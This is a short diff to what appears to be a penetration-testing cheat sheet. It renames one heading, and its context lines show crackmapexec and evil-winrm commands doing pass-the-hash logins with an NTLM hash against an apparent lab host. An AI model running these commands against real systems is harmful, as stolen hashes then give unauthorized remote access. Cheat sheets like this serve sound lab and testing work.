@@ -17,7 +17,7 @@ crackmapexec smb '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71' -
 
 --------------------------------------------------------------
 
-#EvilWinRM
+#Evil-WinRM
 evil-winrm -i <IP> -u <User> -H <NThash>
 evil-winrm -i '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71'
 
